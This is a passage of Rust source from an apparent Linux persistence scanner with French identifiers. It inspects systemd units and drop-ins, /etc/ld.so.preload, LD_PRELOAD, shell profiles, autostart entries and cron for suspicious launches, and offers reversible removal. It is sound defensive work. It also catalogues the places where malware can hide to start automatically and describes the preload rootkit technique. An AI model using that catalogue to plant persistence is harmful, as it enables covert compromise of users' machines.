    let x = |base: &Option<std::path::PathBuf>, c: &str| base.as_ref().map(|b| r.sous(&b.join(c)));
    let mut dossiers: Vec<std::path::PathBuf> = [
        Some(m(".config/systemd/user.control")),
        x(&r.config, "systemd/user.control"),
        Some(run("systemd/user.control")),
        Some(run("systemd/transient")),
        Some(run("systemd/generator.early")),
        Some(m(".config/systemd/user")),
        x(&r.config, "systemd/user"),
        Some(s("/etc/xdg/systemd/user")),
        Some(s("/etc/systemd/user")),
        Some(run("systemd/user")),
        Some(s("/run/systemd/user")),
        Some(run("systemd/generator")),
        Some(m(".local/share/systemd/user")),
        x(&r.donnees, "systemd/user"),
        Some(s("/usr/local/share/systemd/user")),
        Some(s("/usr/share/systemd/user")),
        Some(s("/usr/local/lib/systemd/user")),
        Some(s("/usr/lib/systemd/user")),
        Some(run("systemd/generator.late")),
    ]
    .into_iter()
    .flatten()
    .collect();
    dossiers.dedup();
    Ok(dossiers)
}

/// Les noms des dossiers d'ajout qui s'appliquent à l'unité `nom` : « a-b.service.d », « a-.service.d »,
/// « service.d », et pour une instance « a@.service.d ».
fn ajouts_de(nom: &str) -> Vec<String> {
    let mut noms = vec![format!("{nom}.d")];
    if let Some((base, genre)) = nom.rsplit_once('.') {
        for (i, _) in base.match_indices('-') {
            if let Some(p) = base.get(..=i) {
                noms.push(format!("{p}.{genre}.d"));
            }
        }
        if let Some((gabarit, _)) = base.split_once('@') {
            noms.push(format!("{gabarit}@.{genre}.d"));
        }
        noms.push(format!("{genre}.d"));
    }
    noms.sort();
    noms.dedup();
    noms
}

/// Un fichier d'ajout, ou l'unité d'un ajout : son état, une fois ses directives vérifiées, et son texte (vide pour
/// un ajout absent ou masqué). Un ajout masqué (lien vers /dev/null) ne compte pas, et se lie comme tel.
fn lire_ajout(r: &Releveur, f: &Path) -> Result<(temoins::Etat, String), temoins::Refus> {
    let montre = || crate::ui::affichable(&r.montre(f));
    if std::fs::read_link(f).is_ok_and(|v| v == Path::new("/dev/null")) {
        let masque = temoins::Etat::Lien {
            vers: "/dev/null".into(),
            puis: Box::new(temoins::Etat::Absent),
            vu: std::fs::symlink_metadata(f)
                .map(|m| temoins::Vu::de_dans(&m, f))
                .unwrap_or_default(),
        };
        return Ok((masque, String::new()));
    }
    let lu = match temoins::lire_borne(f, AJOUT_MAX) {
        Ok(lu) => lu,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok((temoins::Etat::Absent, String::new())),
        Err(e) => {
            return Err(temoins::Refus(trf!(
                "{} ne se lit pas ({e})",
                "{} cannot be read ({e})",
                montre()
            )));
        }
    };
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} est trop gros pour être relu à chaque bilan",
            "{} is too large to be re-read at each check",
            montre()
        )));
    }
    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
        return Err(octet_refuse(&montre()));
    };
    if let Some(d) = directive_refusee(texte) {
        return Err(refus_directive(&montre(), &d));
    }
    Ok((temoins::etat_du_contenant(f, &lu.octets)?, texte.to_string()))
}

/// Au plus autant de noms pour une unité (elle et ses alias) : au-delà, la chaîne est trop longue pour se suivre.
const ALIAS_MAX: usize = 32;

/// L'unité `nom` et chacun de ses alias, jusqu'au bout : un lien d'un dossier d'unités vers elle sous un autre nom,
/// ou vers un de ses alias (« alias2 -> alias -> rappel ») ; systemd applique aussi les ajouts posés sous chacun de
/// ces noms, jusque dans le dossier de la session (campagne E, F5 ; vérification, N6). `vraie` : le fichier de
/// l'unité que systemd lance. `Err` : un nom qui n'est pas de l'UTF-8, un lien qui boucle, ou trop d'alias.
fn alias_de(
    r: &Releveur,
    dossiers: &[std::path::PathBuf],
    nom: &str,
    vraie: Option<&Path>,
) -> Result<Vec<String>, temoins::Refus> {
    let vraie = vraie.and_then(|f| std::fs::canonicalize(f).ok());
    // Chaque lien des dossiers d'unités : son nom, son chemin, le nom vers lequel il mène.
    let mut liens: Vec<(String, std::path::PathBuf, Option<std::ffi::OsString>)> = Vec::new();
    for d in dossiers {
        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
            let n = e.file_name();
            // Un nom qui n'est pas de l'UTF-8 ne se compare pas : un alias ainsi nommé échapperait (F1).
            let Some(n) = n.to_str() else {
                return Err(octet_refuse(&crate::ui::affichable(&r.montre(&e.path()))));
            };
            let Ok(vers) = std::fs::read_link(e.path()) else {
                continue;
            };
            liens.push((
                n.to_string(),
                e.path(),
                vers.file_name().map(std::ffi::OsStr::to_os_string),
            ));
        }
    }
    let mut noms = vec![nom.to_string()];
    // Jusqu'au point fixe : chaque tour ajoute au moins un nom, ou s'arrête ; au plus un tour par lien.
    loop {
        let mut ajoute = false;
        for (n, chemin, vers) in &liens {
            if noms.contains(n) {
                continue;
            }
            let meme_nom = vers
                .as_ref()
                .and_then(|v| v.to_str())
                .is_some_and(|v| noms.iter().any(|x| x == v));
            let meme_fichier = match (&vraie, std::fs::canonicalize(chemin)) {
                (_, Err(e)) if e.raw_os_error() == Some(libc::ELOOP) => {
                    return Err(temoins::Refus(trf!(
                        "{} est un lien qui boucle",
                        "{} is a link that loops",
                        crate::ui::affichable(&r.montre(chemin))
                    )));
                }
                (Some(v), Ok(c)) => c == *v,
                _ => false,
            };
            if meme_nom || meme_fichier {
                if noms.len() >= ALIAS_MAX {
                    return Err(temoins::Refus(trf!(
                        "{} a plus de {ALIAS_MAX} alias : la chaîne est trop longue pour se suivre",
                        "{} has more than {ALIAS_MAX} aliases: the chain is too long to follow",
                        crate::ui::affichable(nom)
                    )));
                }
                noms.push(n.clone());
                ajoute = true;
            }
        }
        if !ajoute {
            return Ok(noms);
        }
    }
}

fn refus_directive(fichier: &str, directive: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{fichier} : « {directive} » est hors de la courte liste de ce qui se déclare normal dans une unité (décrire, ordonner, relancer, lignes Exec liées) : ce qu'elle change ne se lie pas",
        "{fichier}: “{directive}” is outside the short list of what can be declared normal in a unit (describe, order, restart, bound Exec lines): what it changes cannot be bound"
    ))
}

/// Pour la ligne `ligne` de l'unité systemd `fichier` (dont `texte` est le contenu lu ; `None` : chaque ligne Exec du
/// fichier est déjà liée par l'appelant) : ce qui change ce que l'unité
/// lance sans toucher à la ligne. Refusé : une unité du même nom dans un dossier qui passe avant, une directive hors
/// de la liste fermée (`directive_refusee`), trop d'ajouts. Lié : chaque fichier d'ajout (drop-in) de chaque dossier
/// de systemd, pour une ligne d'un ajout l'unité elle-même, et ce que lance chaque autre ligne Exec*= de l'unité et
/// de ses ajouts (ExecStartPre=, ExecStop=…), montrée avec ce qu'elle lance : la ligne acceptée n'est pas la seule
/// que l'unité exécute (deuxième vérification de la campagne E, P2).
fn unite(
    r: &mut Releveur,
    fichier: &Path,
    texte: &str,
    utilisateur: bool,
    ligne: Option<&str>,
) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    if let Some(d) = directive_refusee(texte) {
        return Err(refus_directive(&crate::ui::affichable(&r.montre(fichier)), &d));
    }
    let parent = fichier.parent().unwrap_or(Path::new("/"));
    let nom_du_parent = parent.file_name().map(|n| n.to_string_lossy().into_owned());
    let (nom, dossier, ajout) = match nom_du_parent.as_deref().and_then(|n| n.strip_suffix(".d")) {
        Some(n) => (n.to_string(), parent.parent().unwrap_or(Path::new("/")), true),
        None => (
            fichier
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default(),
            parent,
            false,
        ),
    };
    let dossiers = dossiers_d_unites(r, utilisateur)?;
    let mut lies = Vec::new();
    // Chaque texte de l'unité telle que systemd l'assemble : le fichier de la ligne, l'unité d'un ajout, les ajouts.
    let mut textes: Vec<(std::path::PathBuf, String)> = vec![(fichier.to_path_buf(), texte.to_string())];
    // L'unité que systemd lance : la première de ce nom dans l'ordre de ses dossiers.
    let premiere = dossiers
        .iter()
        .find(|d| std::fs::symlink_metadata(d.join(&nom)).is_ok());
    if !ajout {
        if let Some(d) = premiere.filter(|d| d.as_path() != dossier) {
            return Err(temoins::Refus(trf!(
                "une unité du même nom dans {} passe avant {} : c'est elle que systemd lance",
                "a unit of the same name in {} takes precedence over {}: that is the one systemd starts",
                crate::ui::affichable(&r.montre(d)),
                crate::ui::affichable(&r.montre(fichier))
            )));
        }
    } else if let Some(d) = premiere {
        let f = d.join(&nom);
        let (etat, t) = lire_ajout(r, &f)?;
        lies.push((r.montre(&f), etat));
        textes.push((f, t));
    }
    let mut noms = Vec::new();
    for n in alias_de(r, &dossiers, &nom, premiere.map(|d| d.join(&nom)).as_deref())? {
        noms.extend(ajouts_de(&n));
    }
    noms.sort();
    noms.dedup();
    // Une ligne d'un gabarit (« a@.service ») vaut pour chaque instance : leurs ajouts (« a@x.service.d ») aussi.
    let instances = nom
        .rsplit_once('.')
        .and_then(|(b, g)| b.strip_suffix('@').map(|b| (format!("{b}@"), format!(".{g}.d"))));
    let illisible = |d: &Path, e: std::io::Error| {
        temoins::Refus(trf!(
            "{} ne se lit pas ({e})",
            "{} cannot be read ({e})",
            crate::ui::affichable(&r.montre(d))
        ))
    };
    let mut ajouts = Vec::new();
    for d in &dossiers {
        let entrees = match std::fs::read_dir(d) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(illisible(d, e)),
        };
        for e in entrees.flatten() {
            let n = e.file_name().to_string_lossy().into_owned();
            let s_applique = noms.contains(&n)
                || instances
                    .as_ref()
                    .is_some_and(|(debut, fin)| n.starts_with(debut.as_str()) && n.ends_with(fin.as_str()));
            if !s_applique || !std::fs::metadata(e.path()).is_ok_and(|m| m.is_dir()) {
                continue;
            }
            for c in std::fs::read_dir(e.path())
                .map_err(|x| illisible(&e.path(), x))?
                .flatten()
            {
                if c.file_name().to_string_lossy().ends_with(".conf") {
                    ajouts.push(c.path());
                }
            }
        }
    }
    ajouts.sort();
    ajouts.dedup();
    ajouts.retain(|a| a != fichier);
    if ajouts.len() > AJOUTS_MAX {
        return Err(temoins::Refus(trf!(
            "{} fichiers d'ajout pour cette unité, plus que les {AJOUTS_MAX} qui se relisent à chaque bilan",
            "{} drop-in files for this unit, more than the {AJOUTS_MAX} re-read at each check",
            ajouts.len()
        )));
    }
    for a in ajouts {
        let (etat, t) = lire_ajout(r, &a)?;
        lies.push((r.montre(&a), etat));
        textes.push((a, t));
    }
    let maison = r.maison.to_string_lossy().into_owned();
    let contexte = if utilisateur {
        designes::Contexte::Unite(Some(&maison))
    } else {
        designes::Contexte::Unite(None)
    };
    let signalee = ligne.map(|l| l.trim_matches([' ', '\t']));
    for (f, t) in &textes {
        for (_, commande, logique) in lignes_exec(t) {
            if f == fichier && signalee.is_none_or(|l| l == logique) {
                continue;
            }
            let d = designes::commande(&commande, contexte);
            let montree = crate::ui::couper(&crate::ui::affichable(&logique), 60);
            for (chemin, etat) in cibles(r, d, &logique, true)? {
                lies.push((format!("{montree} → {chemin}"), etat));
            }
        }
    }
    Ok(lies)
}

/// Le dossier personnel, en texte, pour déplier « %h/ » d'une unité de l'utilisateur.
fn maison_texte(t: &Lancements) -> String {
    t.r.maison.to_string_lossy().into_owned()
}

/// La ligne `l` (lue par `lines()`) telle qu'écrite dans `texte`, coupée au seul « \n » comme la relit le fils root.
fn telle_qu_ecrite(texte: &str, l: &str) -> String {
    texte
        .split('\n')
        .find(|r| r.strip_suffix('\r').unwrap_or(r) == l)
        .unwrap_or(l)
        .to_string()
}

/// Le fichier et la ligne à retirer, pour `Lancements::retraits`.
fn retrait(f: &Path, texte: &str, l: &str) -> Option<(String, String)> {
    Some((f.to_str()?.to_string(), telle_qu_ecrite(texte, l)))
}

/// /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris. Technique
/// classique des rootkits ; presque aucun système normal n'en a. Puis LD_PRELOAD et LD_AUDIT de cette session.
fn lire_prechargement(
    racine: &Path,
    variable: &impl Fn(&str) -> Option<std::ffi::OsString>,
    gestion: Option<Paquets>,
    t: &mut Lancements,
) {
    let preload = racine.join("etc/ld.so.preload");
    let h = t.r.maison.clone();
    if let Some(lu) = lire(&preload, &h, t) {
        // Coupée comme la coupe le chargeur : espace, tabulation, « : ».
        let libs: Vec<(usize, &str, &str)> = lu
            .texte
            .lines()
            .enumerate()
            .filter(|(_, l)| !commentaire(l))
            .flat_map(|(n, l)| {
                l.split([' ', '\t', ':'])
                    .filter(|m| !m.is_empty())
                    .map(move |lib| (n, l, lib))
            })
            .collect();
        for (n, ligne, lib) in libs {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            t.sources.push(source_de("preload", lib));
            t.retraits.push(retrait(&preload, &lu.texte, ligne));
            let d = designes::bibliotheques(lib, designes::Liste::Fichier);
            let temoin = temoin_de_ligne(t, &preload, n, &lu, ligne, d, false, Sorte::Shell);
            t.temoins.push(temoin);
            // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
            let lib = crate::ui::affichable(lib);
            if connue {
                t.suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                t.critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = variable(var).filter(|v| !v.is_empty()) {
            let valeur = v.to_string_lossy();
            t.sources.push(source_de(&format!("env:{var}"), &valeur));
            t.retraits.push(None);
            let d = designes::bibliotheques(&valeur, designes::Liste::Variable);
            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, &valeur, false)).map(|c| {
                temoins::temoin(
                    &format!("env:{var}"),
                    trf!("{var} de cette session", "{var} of this session"),
                    &valeur,
                    None,
                    &c,
                )
            });
            t.temoins.push(temoin);
            t.suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                crate::ui::affichable(&v.to_string_lossy())
            ));
        }
    }
}

/// Les fichiers de configuration des sessions (environnement, profils des shells, uwsm), du système puis du compte.
fn fichiers_de_configuration(r: &Releveur) -> Vec<std::path::PathBuf> {
    let h = &r.maison;
    let etc = |chemin: &str| r.racine.join(chemin);
    let mut configuration: Vec<std::path::PathBuf> = [
        "etc/environment",
        "etc/profile",
        "etc/bash.bashrc",
        "etc/zsh/zshenv",
        "etc/zsh/zprofile",
        "etc/zsh/zshrc",
        "etc/zsh/zlogin",
        "etc/fish/config.fish",
    ]
    .iter()
    .map(|c| etc(c))
    .collect();
    configuration.extend(fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"]));
    configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&etc("etc/fish/conf.d"), &["fish"]));
    // ~/.bash_login, ~/.zlogin et fish aussi (vérification de la campagne E) : chacun lit du code à l'ouverture.
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bash_login",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".zlogin",
            ".zlogout",
            ".bash_logout",
            ".xprofile",
            ".xsessionrc",
            ".config/fish/config.fish",
        ]
        .iter()
        .map(|f| h.join(f)),
    );
    configuration.extend(fichiers_de(&h.join(".config/fish/conf.d"), &["fish"]));
    if let Some(z) = &r.zdot {
        for f in [".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout"] {
            configuration.push(r.sous(&z.join(f)));
        }
    }
    if let Some(c) = &r.config {
        configuration.push(r.sous(&c.join("fish/config.fish")));
        configuration.extend(fichiers_de(&r.sous(&c.join("fish/conf.d")), &["fish"]));
    }
    configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
    configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
    for f in std::fs::read_dir(h.join(".config/uwsm"))
        .into_iter()
        .flatten()
        .flatten()
    {
        if f.file_name().to_string_lossy().starts_with("env") && f.path().is_file() {
            configuration.push(f.path());
        }
    }
    configuration
}

/// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland), et ceux de
/// Hyprland à part : ils sont aussi des fichiers de configuration.
fn fichiers_de_demarrage(r: &Releveur) -> (Vec<std::path::PathBuf>, Vec<std::path::PathBuf>) {
    const UNITES: [&str; 5] = ["service", "timer", "socket", "path", "conf"];
    let h = &r.maison;
    let etc = |chemin: &str| r.racine.join(chemin);
    let mut demarrage = Vec::new();
    // Les dossiers d'unités du système et des comptes : les liens y sont des alias ou des activations, vers des
    // unités lues ailleurs.
    for d in ["etc/systemd/system", "etc/systemd/user"] {
        let mut unites = fichiers_de(&etc(d), &UNITES);
        unites.retain(|p| !p.is_symlink());
        demarrage.extend(unites);
    }
    // Ceux du compte, dont user.control (prioritaire) et ~/.local/share (installées par le compte).
    for d in [
        ".config/systemd/user",
        ".config/systemd/user.control",
        ".local/share/systemd/user",
    ] {
        demarrage.extend(fichiers_de(&h.join(d), &UNITES));
    }
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
    let mut hypr = fichiers_de(&h.join(".config/hypr"), &["conf", "lua"]);
    // XDG_CONFIG_HOME et XDG_DATA_HOME déplacés : systemd et Hyprland y lisent aussi (vérification de la campagne E,
    // N7 ; M-d ne couvrait que le suivi d'une unité déjà acceptée).
    if let Some(c) = &r.config {
        for d in ["systemd/user", "systemd/user.control"] {
            demarrage.extend(fichiers_de(&r.sous(&c.join(d)), &UNITES));
        }
        demarrage.extend(fichiers_de(&r.sous(&c.join("autostart")), &["desktop"]));
        hypr.extend(fichiers_de(&r.sous(&c.join("hypr")), &["conf", "lua"]));
    }
    if let Some(d) = &r.donnees {
        demarrage.extend(fichiers_de(&r.sous(&d.join("systemd/user")), &UNITES));
    }
    demarrage.extend(hypr.iter().cloned());
    (demarrage, hypr)
}

/// Dans les fichiers de configuration : un préchargement, ou une commande suspecte hors des lignes de démarrage
/// (jugées à part).
fn juger_configuration(
    configuration: &[std::path::PathBuf],
    demarrage: &[std::path::PathBuf],
    h: &Path,
    t: &mut Lancements,
) {
    for f in configuration {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        for (n, l) in lu.texte.lines().enumerate() {
            if definit_prechargement(l) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let d = designes::prechargement(l);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, false, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                    "{}:{} preloads a library (LD_PRELOAD)",
                    court(f, h),
                    n.saturating_add(1)
                ));
            } else if !commentaire(l)
                && !demarrage.contains(f)
                && let Some(raison) = commande_suspecte(l, false)
            {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let d = designes::commande(l, designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, true, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
    }
}

/// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement.
fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancements) {
    for f in demarrage {
        let Some(lu) = lire(f, h, t) else {
            continue;
        };
        let sorte = Sorte::de(f, &t.r);
        for (n, l) in lu.texte.lines().enumerate() {
            let Some((commande, ambigue)) = commande_lancee_lue(l) else {
                continue;
            };
            if let Some(raison) = commande_suspecte(&commande, true) {
                t.sources
                    .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                t.retraits.push(retrait(f, &lu.texte, l));
                let maison = maison_texte(t);
                let d = if ambigue {
                    Designe::Indefini(designes::Flou::Syntaxe)
                } else {
                    designes::commande(&commande, sorte.contexte(&maison))
                };
                let temoin = temoin_de_ligne(t, f, n, &lu, l, d, true, sorte);
                t.temoins.push(temoin);
                t.suspects.push(trf!(
                    "{}:{} : {raison}",
                    "{}:{}: {raison}",
                    court(f, h),
                    n.saturating_add(1)
                ));
            }
        }
    }
}

/// La commande d'une ligne de cron, sans son horaire (« @reboot » ou cinq champs) ni, dans un fichier du système, le
/// compte qui la lance. Coupée comme la coupe cron : espace et tabulation.
fn commande_de_cron(l: &str, systeme: bool) -> String {
    let l = l.trim_matches([' ', '\t']);
    let champs: usize = match (l.starts_with('@'), systeme) {
        (true, false) => 1,
        (true, true) => 2,
        (false, false) => 5,
        (false, true) => 6,
    };
    l.split([' ', '\t'])
        .filter(|m| !m.is_empty())
        .skip(champs)
        .collect::<Vec<_>>()
        .join(" ")
}

/// La crontab du compte et celles du système : chaque ligne est une commande.
fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
    let etc = |chemin: &str| racine.join(chemin);
    let crontab = crontab.unwrap_or_default();
    // La crontab du compte n'a pas de fichier qu'un geste de défense toucherait ; son texte entier est son témoin.
    for (n, l) in crontab.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
        if let Some(raison) = commande_suspecte(l, false) {
            t.sources.push(source_de("crontab", l));
            t.retraits.push(None);
            let numero = n.saturating_add(1);
            let d = designes::commande(&commande_de_cron(l, false), designes::Contexte::Shell);
            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, l, true)).map(|c| {
                temoins::temoin(
                    &format!("crontab:{numero}"),
                    format!("crontab:{numero}"),
                    l,
                    Some(&temoins::Etat::du_contenu(crontab.as_bytes())),
                    &c,
                )
            });
            t.temoins.push(temoin);
            t.suspects.push(trf!("crontab : {raison}", "crontab: {raison}"));
        }
    }
    let mut fichiers_cron = vec![etc("etc/crontab")];
    fichiers_cron.extend(
        std::fs::read_dir(etc("etc/cron.d"))
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path()),
    );
    let h = t.r.maison.clone();
    for f in fichiers_cron {
        let Some(lu) = lire(&f, &h, t) else {
            continue;
        };
        let source = crate::ui::chemin_affichable(&f);
        for (n, l) in lu.texte.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
            if let Some(raison) = commande_suspecte(l, false) {
                t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
                t.retraits.push(retrait(&f, &lu.texte, l));
                let d = designes::commande(&commande_de_cron(l, true), designes::Contexte::Shell);
                let temoin = temoin_de_ligne(t, &f, n, &lu, l, d, true, Sorte::Shell);
                t.temoins.push(temoin);
                t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
            }
        }
    }
}

/// Le constat des lancements : aucun suspect, ou une alerte (critique si une bibliothèque hors paquet est préchargée)
/// qui en nomme six au plus.
fn constat_des_lancements(t: Lancements) -> Constat {
    const CAT: &str = "Persistance";
    let Lancements {
        critiques,
        mut suspects,
        sources,
        mut retraits,
        temoins: releves,
        ..
    } = t;
    suspects.sort();
    suspects.dedup();
    if critiques.is_empty() && suspects.is_empty() {
        return ok(
            CAT,
            tr!(
                "Aucun lancement automatique suspect (préchargement, services, démarrage de session, cron).",
                "No suspicious autostart (preloading, services, session startup, cron)."
            ),
        );
    }
    let niveau = if critiques.is_empty() {
        Niveau::Eleve
    } else {
        Niveau::Critique
    };
    let mut liste = critiques;
    liste.extend(suspects);
    let reste = liste.len().saturating_sub(6);
    liste.truncate(6);
    let mut message = trf!(
        "Lancement automatique suspect : {}",
        "Suspicious autostart: {}",
        liste.join(" ; ")
    );
    if reste > 0 {
        let _ = trw!(message, " ; et {reste} autre(s)", "; and {reste} more");
    }
    message.push('.');
    let constat = alerte(CAT, niveau, message).avec_objet(objet_des_lancements(sources)).manuel(
        tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que vous n'avez pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
        &[],
    );
    // Par des gestes de défense seulement si chaque ligne signalée est dans un fichier du système qu'un geste a le
    // droit de modifier : une ligne du dossier personnel, de la crontab du compte ou une variable de la session
    // laisse tout à la main (une correction qui en ferait une partie se croirait complète).
    retraits.dedup();
    let mut vus: Vec<&(String, String)> = Vec::new();
    let mut a_la_main = false;
    for r in &retraits {
        match r {
            Some(r) if !vus.contains(&r) => vus.push(r),
            Some(_) => {}
            None => a_la_main = true,
        }
    }
    let gestes = if a_la_main {
        Vec::new()
    } else {
        crate::machine::defense::tous(vus, |(f, l)| crate::machine::defense::retirer_ligne(f, l))
    };
    crate::machine::defense::corriger(
        constat,
        tr!(
            "Retirer ces lignes (chaque fichier est gardé entier dans sa note, Défaire le remet), puis lancer l'antivirus",
            "Remove these lines (each file is kept whole in its note, Undo puts it back), then run the antivirus"
        ),
        &gestes,
    )
    .avec_temoins(temoins::Temoins::de(releves))
}

/// Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root. On les nomme
/// pour que tu les reconnaisses, sans baisser la note.
fn services_ajoutes(racine: &Path, gestion: Option<Paquets>, r: &mut Releveur) -> Option<Constat> {
    let gestion = gestion?;
    let systeme = racine.join("etc/systemd/system");
    let mut fichiers: Vec<std::path::PathBuf> = fichiers_de(&systeme, &["service", "timer"])
        .into_iter()
        .filter(|p| p.parent() == Some(systeme.as_path()) && !p.is_symlink())
        .filter(|p| !gestion.possede(p))
        .collect();
    fichiers.sort();
    let ajoutes: Vec<String> = fichiers
        .iter()
        .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .collect();
    // Un choix « normal » est lié au contenu de chaque fichier de service, à ce qu'il lance et à ses ajouts :
    // changé, l'information revient.
    let mut releves = Vec::with_capacity(fichiers.len());
    for f in &fichiers {
        let temoin = if releves.len() >= temoins::TEMOINS_MAX {
            Err(temoins::Refus(trf!(
                "plus de {} services ajoutés, plus que ceux qui se montrent avant un tel choix",
                "more than {} added services, more than can be shown before such a choice",
                temoins::TEMOINS_MAX
            )))
        } else {
            temoin_de_service(r, f)
        };
        releves.push(temoin);
    }
    // Seulement depuis la vraie racine : les noms d'une arborescence fabriquée ne désignent rien de cet ordinateur.
    juger_services_ajoutes(&ajoutes, racine == Path::new("/")).map(|c| c.avec_temoins(temoins::Temoins::de(releves)))
}

/// Le témoin d'un service système ajouté à la main : son fichier, chaque programme que lancent ses lignes « Exec… »
/// (`designes`, comme une unité du système), et ses ajouts (`unite`).
fn temoin_de_service(r: &mut Releveur, f: &Path) -> Result<temoins::Temoin, temoins::Refus> {
    let montre = crate::ui::chemin_affichable(f);
    let lu = temoins::lire_borne(f, AJOUT_MAX)
        .map_err(|e| temoins::Refus(trf!("{montre} ne se lit pas ({e})", "{montre} cannot be read ({e})")))?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{montre} est trop gros pour être relu à chaque bilan",
            "{montre} is too large to be re-read at each check"
        )));
    }
    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
        return Err(octet_refuse(&montre));
    };
    let mut cibles_liees = Vec::new();
    for l in texte.lines() {
        let Some((commande, _)) = commande_lancee_lue(l) else {
            continue;
        };
        let d = designes::commande(&commande, designes::Contexte::Unite(None));
        cibles_liees.extend(cibles(r, d, l, true)?);
    }
    // Les lignes Exec du fichier sont liées ci-dessus ; `unite` lie celles de ses ajouts.
    cibles_liees.extend(unite(r, f, texte, false, None)?);
    cibles_liees.push(environnement_lie(r)?);
    let nom = f
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    Ok(temoins::temoin(
        &f.to_string_lossy(),
        montre,
        &nom,
        Some(&temoins::etat_du_contenant(f, &lu.octets)?),
        &cibles_liees,
    ))
}

/// `ajoutes` : les noms de fichier tels que lus (triés). `gestes` : désactiver chacun par un geste de défense, chacun
/// demandé à part sur le terminal ; jamais une unité de session (connexion à distance, écran de connexion), que
/// l'enfant root refuserait. Un nom qu'un geste ne porte pas (forgé, gabarit) laisse tout à la main.
fn juger_services_ajoutes(ajoutes: &[String], gestes: bool) -> Option<Constat> {
    const CAT: &str = "Persistance";
    let affiches: Vec<String> = ajoutes.iter().map(|n| crate::ui::affichable(n)).collect();
    let premier = affiches.first()?.clone();
    let constat = alerte(
        CAT,
        Niveau::Info,
        trf!(
            "{} service(s) système ajouté(s) à la main, hors paquet : {}. À reconnaître.",
            "{} system service(s) added by hand, not from a package: {}. Check that you recognize them.",
            affiches.len(),
            affiches.join(", ")
        ),
    )
    .avec_objet(crate::modele::Objet::de("services", &affiches.join(",")))
    .manuel(
        tr!(
            "Si vous n'en reconnaissez pas un, lisez ce qu'il lance avant de le désactiver",
            "If you do not recognize one, read what it starts before turning it off"
        ),
        &[&format!("systemctl cat {}", crate::commande::sh_chaine(&premier))],
    );
    if !gestes {
        return Some(constat);
    }
    let gestes = crate::machine::defense::tous(
        ajoutes.iter().filter(|n| !gestes_unix::unite_portant_les_sessions(n)),
        |n| gestes_unix::NomUnite::nouveau(n).map(Defense::DesactiverService),
    );
    Some(crate::machine::defense::corriger(
        constat,
        tr!(
            "Désactiver ceux que vous ne reconnaissez pas (chacun demandé à part ; Défaire les remet) ; « systemctl cat <service> » montre ce qu'il lance",
            "Turn off the ones you do not recognize (each asked separately; Undo puts them back); “systemctl cat <service>” shows what it starts"
        ),
        &gestes,
    ))
}

/// Fichiers listés par « getcap -r » : « /usr/bin/ping cap_net_raw=ep » (ancien format : « /usr/bin/ping = cap_net_raw+ep »).
pub(super) fn fichiers_capacites(texte: &str) -> Vec<std::path::PathBuf> {
    texte
        .lines()
        .filter_map(|l| l.split_once(" = ").or_else(|| l.rsplit_once(' ')))
